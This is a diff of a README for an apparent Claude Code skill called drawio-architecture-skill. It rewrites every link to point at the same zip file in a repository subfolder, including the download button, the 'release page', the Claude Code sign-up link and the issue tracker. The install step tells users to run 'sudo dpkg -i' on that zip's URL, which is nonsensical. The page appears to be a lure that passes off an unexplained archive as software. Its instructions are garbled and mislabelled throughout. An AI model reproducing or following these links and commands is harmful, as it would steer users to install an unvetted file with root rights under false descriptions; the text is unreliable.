@@ -1,6 +1,6 @@
 # 🖊️ drawio-architecture-skill - Create Clear Architecture Diagrams Easily
 
-[![Download drawio-architecture-skill](https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip)](https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip)
+[![Download drawio-architecture-skill](https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip)](https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get drawio-architecture-skill running on your computer. Th
 
 Click the big button above or go directly to the release page here:
 
-[https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip](https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip)
+[https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip](https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip)
 
 This page has all versions of the software. Look for the latest release—it usually appears near the top.
 
@@ -95,7 +95,7 @@ Now that you have the installer file, follow these steps to install the skill on
    - Double-click to launch.
 3. For `.deb`:
    - Open a terminal.
-   - Type `sudo dpkg -i https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip` replacing `https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip` with your file name.
+   - Type `sudo dpkg -i https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip` replacing `https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip` with your file name.
    - Press Enter and follow prompts.
 4. Once done, find drawio-architecture-skill in your application menu.
 
@@ -109,7 +109,7 @@ Once you have the skill installed and open, here is how to start creating your d
 
 drawio-architecture-skill works within Claude Code. If you do not have Claude Code:
 
-- Visit https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip or your Claude Code client.
+- Visit https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip or your Claude Code client.
 - Sign up or log in.
 
 ### Step 2: Start a New Diagram
@@ -174,7 +174,7 @@ If you encounter issues:
 
 If problems continue, open an issue on the GitHub repository:
 
-https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip
+https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip
 
 Include a clear description and screenshots if possible.
 
@@ -207,4 +207,4 @@ Tags that describe this skill:
 
 Remember, you can always return to the releases page here to get the latest version or updates:
 
-[https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip](https://raw.githubusercontent.com/quant-chiggz/drawio-architecture-skill/main/Cenchrus/drawio_skill_architecture_1.0.zip)
+[https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip](https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip)
